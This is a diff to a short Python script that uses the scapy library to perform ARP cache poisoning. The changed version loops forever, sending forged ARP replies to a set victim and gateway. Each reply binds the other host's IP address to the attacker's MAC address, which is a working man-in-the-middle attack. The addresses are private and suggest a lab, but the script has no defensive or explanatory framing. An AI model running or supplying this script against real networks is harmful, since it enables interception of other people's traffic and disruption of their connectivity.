@@ -1,29 +1,32 @@
 #!/usr/bin/python
-#
-
 """
   ARP poisoning using gratuious ARP requests
-
-- send gratuitous ARP to victim and gateway, 
-- with the hacker machine's MAC
-
- -g gateway IP address
- -v victim IP address
- -m MAC address to poison
-
 """
 
 import sys
-import getopt
+import time
 from scapy.all import *
 
-GATEWAY_IPADDR = '192.168.56.1'
-VICTIM_IPADDR  = '192.168.56.101'
-HACKER_MACADDR = '08:00:27:0c:c1:12'
+GATEWAY_IPADDR = '10.10.111.1'
+GATEWAY_MACADDR = '02:00:8a:62:0a:02'
+VICTIM_IPADDR  = '10.10.111.110'
+VICTIM_MACADDR = '02:00:8a:7e:0c:01'
+HACKER_MACADDR = '02:00:8a:46:08:01'
 
-arp_pkts = Ether(dst='00:00:00:00:00:00')/\
-           ARP(op = 2, psrc = [GATEWAY_IPADDR, VICTIM_IPADDR], \
-               pdst = '0.0.0.0', hwsrc = HACKER_MACADDR)
+while True:
 
-sendp(arp_pkts, iface='p7p1')
+  # make the ARP gratuitous packets
+  arp_pkt1 = Ether(dst=VICTIM_MACADDR)/\
+               ARP(op = 2, psrc = GATEWAY_IPADDR, \
+                   pdst = '0.0.0.0', hwsrc = HACKER_MACADDR)
+
+  arp_pkt2 = Ether(dst=GATEWAY_MACADDR)/\
+               ARP(op = 2, psrc = VICTIM_IPADDR, \
+                   pdst = '0.0.0.0', hwsrc = HACKER_MACADDR)
+
+  # send the two packets for gateway and victim machines
+  sendp(arp_pkt1, iface='eth0')
+  sendp(arp_pkt2, iface='eth0')
+
+  time.sleep(1)
 
